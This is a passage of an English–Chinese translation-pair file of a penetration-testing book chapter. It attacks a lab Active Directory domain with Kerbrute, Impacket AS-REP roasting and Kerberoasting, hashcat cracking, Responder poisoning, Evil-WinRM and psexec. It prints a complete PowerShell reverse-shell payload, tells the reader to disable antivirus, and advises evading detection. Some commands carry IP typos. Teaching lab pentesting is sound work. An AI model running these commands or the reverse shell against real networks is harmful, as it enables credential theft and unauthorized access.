  type: TYPE_NORMAL
  zh: 让我们先跳过**rustscan**和**nmap**，直接开始通过NetBIOS名称枚举主机。使用以下命令在当前子网中运行**nbtscan**命令：
- en: nbtscan 172.16.0.0/24
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: nbtscan 172.16.0.0/24
- en: 'We should now see our two machines, **DC01** and **WS01**, as shown in the
    following screenshot:'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们应该能看到两台机器，**DC01**和**WS01**，如下图所示：
- en: '![Figure 10.50 – nbtscan'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.50 – nbtscan'
- en: '](image/Figure_10.50_B16321.jpg)'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.50_B16321.jpg)'
- en: Figure 10.50 – nbtscan
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.50 – nbtscan
- en: 'Quickly identifying NetBIOS names allows us to take an educated guess that
    **DC01** is the domain controller. With this information in mind, we now want
    to run **enum4linux** against the discovered machine names, to see whether we
    can extract more detail. Run the following command:'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 快速识别NetBIOS名称让我们有理由猜测**DC01**是域控制器。记住这些信息后，我们现在希望对发现的机器名称运行**enum4linux**，看看是否能提取更多的细节。运行以下命令：
- en: enum4linux 172.16.0.2
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: enum4linux 172.16.0.2
- en: 'You should see the following results:'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该看到以下结果：
- en: '![Figure 10.51 – enum4linux'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.51 – enum4linux'
- en: '](image/Figure_10.51_B16321.jpg)'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.51_B16321.jpg)'
- en: Figure 10.51 – enum4linux
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.51 – enum4linux
- en: 'We have now discovered the **LABCORP** domain name. From here, we want to try
    and enumerate users that may exist on the domain. Using Kerbrute (we installed
    this in the last section) will allow us to enumerate users by sending Kerberos
    requests to the domain controller. We do this by using a generated list of traditional
    ICS users that contains usernames such as these:'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已经发现了**LABCORP**域名。从这里开始，我们希望尝试枚举可能存在于该域中的用户。使用Kerbrute（我们在上一节中安装了它）可以通过向域控制器发送Kerberos请求来枚举用户。我们通过使用包含以下用户名的传统ICS用户生成的列表来执行此操作：
- en: '**admin**'
  id: totrans-244
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**admin**'
- en: '**root**'
  id: totrans-245
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**root**'
- en: '**operator1**'
  id: totrans-246
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator1**'
- en: '**operator2**'
  id: totrans-247
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator2**'
- en: '**operator3**'
  id: totrans-248
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**operator3**'
- en: '**scada**'
  id: totrans-249
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**scada**'
- en: '**scada-user**'
  id: totrans-250
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**scada-user**'
- en: '**scada1**'
  id: totrans-251
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**scada1**'
- en: '**scada2**'
  id: totrans-252
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**scada2**'
- en: 'We can now run the following command:'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以运行以下命令：
- en: ./kerbrute_linux_amd64 userenum Industrial_Pentesting/users.txt -d labcorp.local
    -dc 172.16.0.2
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: ./kerbrute_linux_amd64 userenum Industrial_Pentesting/users.txt -d labcorp.local
    -dc 172.16.0.2
- en: 'You can see from the following output that we successfully enumerated four
    valid users:'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以从以下输出看到，我们成功地枚举了四个有效用户：
- en: '![Figure 10.52 – Enumerated users'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.52 – 枚举的用户'
- en: '](image/Figure_10.52_B16321.jpg)'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.52_B16321.jpg)'
- en: Figure 10.52 – Enumerated users
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.52 – 枚举的用户
- en: 'Next, we are going to use some sub-features of the Impacket tool that we installed
    in the last section. Specifically, we are going to run the **impacket-GetNPUsers**
    command to see whether any of the AD users have Kerberos preauthentication disabled.
    Run the following command:'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将使用我们在上一节中安装的Impacket工具的一些子功能。具体来说，我们将运行**impacket-GetNPUsers**命令，看看是否有任何AD用户禁用了Kerberos预身份验证。运行以下命令：
- en: impacket-GetNPUsers labcorp.local/Adminstrator -dc-ip 127.16.0.2 -no-pass
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: impacket-GetNPUsers labcorp.local/Adminstrator -dc-ip 127.16.0.2 -no-pass
- en: 'And as expected, the **Administrator** account has **preauth** enabled, as
    shown here:'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 如预期，**Administrator**账户已启用**preauth**，如下所示：
- en: '![Figure 10.53 – Impacket administrator check'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.53 – Impacket管理员检查'
- en: '](image/Figure_10.53_B16321.jpg)'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.53_B16321.jpg)'
- en: Figure 10.53 – Impacket administrator check
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.53 – Impacket管理员检查
- en: 'Now test another account. If you recall the AD user setup where we adjusted
    operator2''s config by disabling **preauth**, we should get a valid response by
    using the following command:'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 现在测试另一个账户。如果你还记得我们调整operator2配置时禁用**preauth**的AD用户设置，那么使用以下命令应能得到有效响应：
- en: impacket-GetNPUsers labcorp.local/operator2 -dc-ip 127.16.0.2 -no-pass
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: impacket-GetNPUsers labcorp.local/operator2 -dc-ip 127.16.0.2 -no-pass
- en: 'You can see that we have discovered a hash for **operator2**:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到我们发现了**operator2**的哈希：
- en: '![Figure 10.54 – operator2 hash'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: '![图10.54 – operator2哈希'
- en: '](image/Figure_10.54_B16321.jpg)'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.54_B16321.jpg)'
- en: Figure 10.54 – operator2 hash
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 图10.54 – operator2哈希
- en: 'Discovering this hash, we can use **hashcat**. Use mode, **-m 18200** for Kerberos
    to crack this hash by running the following command:'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 发现此哈希后，我们可以使用**hashcat**。使用模式**-m 18200**对Kerberos哈希进行破解，运行以下命令：
- en: sudo hashcat -m 18200 operator2.hash /usr/share/wordlists/rockyou.txt
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: sudo hashcat -m 18200 operator2.hash /usr/share/wordlists/rockyou.txt
- en: 'Depending on the complexity of your password, this could take a fair amount
    of time. However, if you kept the current settings from earlier in the chapter,
    it will only take a few seconds to crack the **operator2** password. Here, you
    can see that at the end of the Kerberos hash, the password, **Password2**, has
    been appended, indicating that we have successfully cracked the hash:'
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 根据密码的复杂性，这可能需要相当长的时间。然而，如果你保持本章之前的设置，破解**operator2**密码只需几秒钟。在这里，你可以看到在 Kerberos
    哈希的末尾，密码**Password2**已经被附加，表明我们成功破解了哈希：
- en: '![Figure 10.55 – operator2''s password'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.55 – operator2 的密码'
- en: '](image/Figure_10.55_B16321.jpg)'
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.55_B16321.jpg)'
- en: Figure 10.55 – operator2's password
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.55 – operator2 的密码
- en: 'We could simply use these newly discovered credentials to remote to the machine,
    or leverage them to do more discovery through Impacket. Since the title of this
    section is *Discovering and launching our attacks*, we are going to leverage this
    account to perform further discovery. We are going to run the following command:'
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以直接使用这些新发现的凭据远程登录到该机器，或者利用它们通过 Impacket 进行更多的发现。由于本节的标题是*发现并启动我们的攻击*，我们将利用这个帐户进行进一步的发现。我们将运行以下命令：
- en: impacket-GetADUsers -all labcorp.local/operator2 -dc-ip 172.16.0.2
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: impacket-GetADUsers -all labcorp.local/operator2 -dc-ip 172.16.0.2
- en: 'This will use **operator2** to enumerate all the AD users:'
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 这将使用**operator2**枚举所有的 AD 用户：
- en: '![Figure 10.56 – GetADUsers'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.56 – GetADUsers'
- en: '](image/Figure_10.56_B16321.jpg)'
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.56_B16321.jpg)'
- en: Figure 10.56 – GetADUsers
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.56 – GetADUsers
- en: 'Continuing down the discovery path, we are going to use another Impacket tool
    to extract service accounts using the default behavior of Kerberos. We are going
    to run the following command:'
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: 继续发现路径，我们将使用另一个 Impacket 工具，使用 Kerberos 的默认行为提取服务帐户。我们将运行以下命令：
- en: impacket-GetUserSPNs labcorp.local/operator2:Password2 -dc-ip 172.16.0.2 -request
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: impacket-GetUserSPNs labcorp.local/operator2:Password2 -dc-ip 172.16.0.2 -request
- en: 'This is a very scary attack, as it does not require an elevated user to extract
    service accounts inside the domain controller. After running the command, you
    should see that we have discovered the SPN of **operator3**. This is from the
    Kerberos configuration portion of the last section:'
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个非常可怕的攻击，因为它不需要提升的用户权限就可以从域控制器中提取服务帐户。在运行该命令后，你应该看到我们已经发现了**operator3**的
    SPN。这来自上一节中的 Kerberos 配置部分：
- en: '![Figure 10.57 – SPN'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.57 – SPN'
- en: '](image/Figure_10.57_B16321.jpg)'
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.57_B16321.jpg)'
- en: Figure 10.57 – SPN
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.57 – SPN
- en: 'Once again, we have discovered a hash and, from looking at it, it appears to
    be Kerberos but in a different format. Doing some simple research, we discover
    that it is saved in TGS format. Now, we want to crack the hash using **hashcat**,
    by running the following command:'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: 再次，我们发现了一个哈希，看看它的样子，似乎是 Kerberos 哈希，但格式不同。通过简单的研究，我们发现它是以 TGS 格式保存的。现在，我们想用**hashcat**破解这个哈希，运行以下命令：
- en: hashcat -m 13100 operator3.hash /usr/share/wordlists/rockyou.txt
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: hashcat -m 13100 operator3.hash /usr/share/wordlists/rockyou.txt
- en: 'This will then successfully crack the hash and present you with the following
    output:'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 这将成功破解哈希，并向你展示以下输出：
- en: '![Figure 10.58 – operator3 cracked password'
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.58 – operator3 破解的密码'
- en: '](image/Figure_10.58_B16321.jpg)'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.58_B16321.jpg)'
- en: Figure 10.58 – operator3 cracked password
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.58 – operator3 破解的密码
- en: Next, we are going to run **responder**. This gets installed with Impacket.
    Now, **responder** gives us the ability to poison **Link-Local Multicast Name
    Resolution** (**LLMNR**), and spoof an SMB request in order to capture Windows
    **New Technology LAN Manager** (**NTLM**) hashes on the network.
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将运行**responder**。它与 Impacket 一起安装。现在，**responder**使我们能够中毒**Link-Local
    Multicast Name Resolution**（**LLMNR**），并伪造 SMB 请求以便捕获网络上的 Windows **New Technology
    LAN Manager**（**NTLM**）哈希。
- en: 'We are going to run **responder** with the following command:'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用以下命令运行**responder**：
- en: sudo responder -I eth1
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: sudo responder -I eth1
- en: 'You should get the following results showing that the poisoners are running
    and that the servers are live:'
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该得到以下结果，显示毒害工具正在运行，且服务器是活跃的：
- en: '![Figure 10.59 – responder running'
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.59 – responder 正在运行'
- en: '](image/Figure_10.59_B16321.jpg)'
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.59_B16321.jpg)'
- en: Figure 10.59 – responder running
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.59 – responder 正在运行
- en: 'Now, to trigger the capture, as we have a very static lab environment, log
    into your Windows 10 VM and open your browser. Type in a string and press *Enter*:'
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，为了触发捕获，由于我们有一个非常静态的实验环境，登录到你的 Windows 10 虚拟机并打开浏览器。输入一个字符串并按 *Enter*：
- en: '![Figure 10.60 – Test'
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.60 – 测试'
- en: '](image/Figure_10.60_B16321.jpg)'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.60_B16321.jpg)'
- en: Figure 10.60 – Test
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.60 – 测试
- en: 'If everything is set up correctly, you should see that **responder** has captured
    the NTLM hash for **operator1**, as shown here:'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: 如果一切配置正确，你应该会看到**responder**已经捕获了**operator1**的NTLM哈希，如下所示：
- en: '![Figure 10.61 – NTLM hash'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.61 – NTLM 哈希'
- en: '](image/Figure_10.61_B16321.jpg)'
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.61_B16321.jpg)'
- en: Figure 10.61 – NTLM hash
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.61 – NTLM 哈希
- en: 'As we have done previously, we will use **hashcat** to crack the password for
    **operator1**. Run the following command:'
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们之前所做的，我们将使用**hashcat**来破解**operator1**的密码。运行以下命令：
- en: hashcat -m 5600 operator1.hash /usr/share/wordlists/rockyou.txt
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: hashcat -m 5600 operator1.hash /usr/share/wordlists/rockyou.txt
- en: 'The password should crack relatively fast and you will see the following result:'
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 密码应该很快被破解，你将看到以下结果：
- en: '![Figure 10.62 – operator1 password'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.62 – operator1 密码'
- en: '](image/Figure_10.62_B16321.jpg)'
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.62_B16321.jpg)'
- en: Figure 10.62 – operator1 password
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.62 – operator1 密码
- en: In this section, you can see how easy it is, with the right tools, to start
    to enumerate a domain controller to gain useful insight into the corporate environment.
    We were able to enumerate credentials and discover domain accounts with a general
    user account. We were able to capture hashes by poisoning LLMNR, NBT-NS, and DNS/MDNS.
    Throughout the section, we used **hashcat** to perform various modes of cracking
    on the hashes that we discovered. We have barely touched on a fraction of the
    power that these tools contain. I strongly encourage you to read up on the documentation
    for enum4linux, Impacket, Kerbrute, and hashcat.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一部分，你可以看到，借助合适的工具，如何轻松地开始枚举域控制器，从而获取企业环境中的有用信息。我们能够通过一般用户帐户枚举凭据并发现域帐户。我们通过毒化LLMNR、NBT-NS
    和 DNS/MDNS捕获了哈希。在本节中，我们使用了**hashcat**对我们发现的哈希执行了各种破解模式。我们只是触及了这些工具所包含的部分强大功能。我强烈建议你阅读
    enum4linux、Impacket、Kerbrute 和 hashcat 的文档。
- en: In the next section, we are going to leverage the **username:password** combinations
    that we discovered and cracked, to gain a foothold into the various systems in
    the corporate network.
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的章节中，我们将利用我们发现并破解的**用户名:密码**组合，进入企业网络中的各个系统。
- en: Getting shells
  id: totrans-318
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 获取 shell
- en: Now that we have three sets of credentials and a list of five additional usernames,
    it is time to leverage the credentials and land a foothold/shell into the corporate
    computers. We are going to leverage Evil-WinRM, Impacket-psexec, and PowerShell
    to perform various exploits to gain access to the Windows hosts.
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们有了三组凭据和五个额外用户名的列表，是时候利用这些凭据，获取企业计算机的 foothold/shell 了。我们将使用 Evil-WinRM、Impacket-psexec
    和 PowerShell 执行各种漏洞利用，获取 Windows 主机的访问权限。
- en: 'We are going to start with **Evil-WinRM**, and we will be using the following
    credentials to see whether we can get a shell: **operator2:Password2**. Run the
    following command:'
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将从**Evil-WinRM**开始，使用以下凭据查看是否能够获得一个 shell：**operator2:Password2**。运行以下命令：
- en: evil-winrm -I 172.16.0.4 -u operator2 -p Password2
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: evil-winrm -I 172.16.0.4 -u operator2 -p Password2
- en: 'If everything has been configured correctly from the first section of this
    chapter, you will get the following result:'
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 如果本章第一部分的配置都正确，你将看到以下结果：
- en: '![Figure 10.63 – Evil-WinRM shell'
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.63 – Evil-WinRM shell'
- en: '](image/Figure_10.63_B16321.jpg)'
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.63_B16321.jpg)'
- en: Figure 10.63 – Evil-WinRM shell
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.63 – Evil-WinRM shell
- en: '*Voilà*! We have our first shell, and now it is time to explore the capabilities
    of our new shell. Type in the **menu** command and press *Enter*. This will then
    bring up a list of post-exploit modules:'
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: '*瞧*! 我们得到了第一个 shell，现在是时候探索我们新 shell 的功能了。输入**menu**命令并按下*Enter*。这将弹出一份后渗透模块列表：'
- en: '![Figure 10.64 – Evil-WinRM shell menu'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.64 – Evil-WinRM shell 菜单'
- en: '](image/Figure_10.64_B16321.jpg)'
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.64_B16321.jpg)'
- en: Figure 10.64 – Evil-WinRM shell menu
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.64 – Evil-WinRM shell 菜单
- en: Story Time
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: 故事时间
- en: 'I remember having a conversation with Rob Mubix Fuller. He imparted a nugget
    of wisdom to me that had previously been passed on to him: *two is one and one
    is none*, meaning that if you have a shell and only one shell, you don''t really
    have any shells. You need a backup plan in case your primary session gets lost
    or severed. This has always stuck with me, and I will pass this insight on to
    you. So remember, if you land a shell, make sure to build a second one as fast
    as possible.'
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 我记得曾与 Rob Mubix Fuller 进行过一次对话。他传授给我一条智慧箴言，这条箴言曾被传递给他：*两个是一个，一个是零*，意思是如果你只有一个
    shell，那么实际上你根本就没有 shell。你需要一个备份计划，以防你的主会话丢失或被切断。这句话一直深深印在我脑海中，我也会将这一见解传递给你。所以记住，如果你成功获取了一个
    shell，务必尽快构建第二个 shell。
- en: 'With that said, we need to build out another shell. A great resource is **Payloads
    All The Things**. This can be accessed via the following link: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).'
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: 话虽如此，我们需要构建另一个 shell。一个很好的资源是**Payloads All The Things**。可以通过以下链接访问：[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)。
- en: 'We will be using the Reverse Shell Cheat Sheet to find a PowerShell method.
    The following code shows the PowerShell command that we will be using to connect
    back to our Kali Linux VM:'
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用反向 Shell 备忘单来找到一个 PowerShell 方法。以下代码展示了我们将用于连接回 Kali Linux 虚拟机的 PowerShell
    命令：
- en: client = New-Object System.Net.Sockets.TCPClient("172.16.0.6",4242);$stream
    = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,
    0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
    $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS '
    + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: client = New-Object System.Net.Sockets.TCPClient("172.16.0.6",4242);$stream
    = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,
    0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
    $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS '
    + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
- en: 'To make this work in our current environment, we must disable **Real-time protection**
    on the Windows 10 VM:'
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: 为了在我们当前的环境中使其生效，我们必须禁用 Windows 10 虚拟机上的**实时保护**：
- en: '![Figure 10.65 – Virus and threat protection settings'
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.65 – 病毒与威胁防护设置'
- en: '](image/Figure_10.65_B16321.jpg)'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.65_B16321.jpg)'
- en: Figure 10.65 – Virus and threat protection settings
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.65 – 病毒与威胁防护设置
- en: 'After disabling **Real-time protection**, we are going to set up a new listener
    using the following command:'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: 禁用**实时保护**后，我们将使用以下命令设置一个新的监听器：
- en: nc -nvlp 4242
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: nc -nvlp 4242
- en: 'After executing the command, we will see the following output:'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: 执行该命令后，我们将看到以下输出：
- en: '![Figure 10.66 – Listener port 4242'
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.66 – 监听端口 4242'
- en: '](image/Figure_10.66_B16321.jpg)'
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.66_B16321.jpg)'
- en: Figure 10.66 – Listener port 4242
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.66 – 监听端口 4242
- en: 'Next, we want to execute the PowerShell command from the previous figure. Once
    the reverse shell connects, we will see the following output:'
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们要执行前面图示中的 PowerShell 命令。一旦反向 shell 连接成功，我们将看到以下输出：
- en: '![Figure 10.67 – Reverse PowerShell'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.67 – 反向 PowerShell'
- en: '](image/Figure_10.67_B16321.jpg)'
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.67_B16321.jpg)'
- en: Figure 10.67 – Reverse PowerShell
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.67 – 反向 PowerShell
- en: 'Now we have successfully landed a reverse shell using the PowerShell payload.
    Next, we are going to run an exploit with Impacket-psexec to gain a new shell.
    We will be using the Domain Admin account that we created in the first section
    of this chapter. Start by running the following command:'
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经成功地使用 PowerShell 载荷获取了反向 shell。接下来，我们将使用 Impacket-psexec 运行一个漏洞利用来获取一个新的
    shell。我们将使用在本章第一节中创建的域管理员账户。首先运行以下命令：
- en: impacket-psexec labcorp.local/lab.da:'Password123'@172.16.02
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: impacket-psexec labcorp.local/lab.da:'Password123'@172.16.02
- en: 'After running the preceding command, you will see the following outcome:'
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 执行上述命令后，你将看到以下结果：
- en: '![Figure 10.68 – impacket-psexec'
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.68 – impacket-psexec'
- en: '](image/Figure_10.68_B16321.jpg)'
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.68_B16321.jpg)'
- en: Figure 10.68 – impacket-psexec
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.68 – impacket-psexec
- en: After getting this far, you might be asking yourself – since we already have
    credentials, couldn't we just **Remote Desktop Protocol** (**RDP**) to the Windows
    host and try to exploit from there? You would be absolutely correct. You could
    use the credentials and RDP to the Windows host. However, you would have to be
    careful. However much we cover our tracks, there will always be a trail to follow.
    If you start to use RDP sessions, they can become very loud and you will most
    likely start to bump into the owners of the credentials that you have cracked
    because they could be logged into the machine.
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，你可能会问自己——既然我们已经有了凭据，难道不能直接通过**远程桌面协议**（**RDP**）连接到 Windows 主机并尝试从那里进行攻击吗？你完全正确。你可以使用这些凭据，通过
    RDP 连接到 Windows 主机。然而，你必须小心。无论我们如何掩藏踪迹，总会留下痕迹。如果你开始使用 RDP 会话，它们可能会变得非常显眼，而且你很可能会遇到你破解的凭据的拥有者，因为他们可能已经登录到机器上了。
- en: Summary
  id: totrans-356
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: This chapter has covered a lot of material. We built out a domain controller
    with AD, set up a DNS server and a DHCP server, created a file share, and used
    multiple tools to enumerate, poison traffic, and gain shells. Every one of these
    topics and tools is deserving of its own book. To be honest, writing about the
    corporate side after spending a career in the operational technology field does
    feel a bit like "imposter syndrome." I can certainly reaffirm the importance of
    practicing gaining access to individual hosts on the corporate network, as no
    two pentest engagements are alike. You cannot expect to succeed if you don't try
    harder and round out your skillset. In the next chapter, we will be diving deeper
    into the network by pivoting through our current lab setup to examine the process
    level and ultimately end up controlling the physical I/O.
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 本章涵盖了大量内容。我们搭建了一个带有 AD 的域控制器，设置了 DNS 服务器和 DHCP 服务器，创建了文件共享，并使用多种工具进行枚举、投毒流量并获得
    shell。每一个话题和工具都值得写成一本书。说实话，在花了很多年从事操作技术领域的工作后，写关于公司网络的内容，确实有些像是“冒名顶替综合症”。我可以毫不犹豫地重申，练习获取公司网络中单个主机的访问权限非常重要，因为没有两个渗透测试任务是完全相同的。如果不更加努力并全面提升自己的技能，不能指望自己成功。在下一章，我们将通过当前实验室环境进行深度探索，检查进程级别，并最终实现对物理
    I/O 的控制。
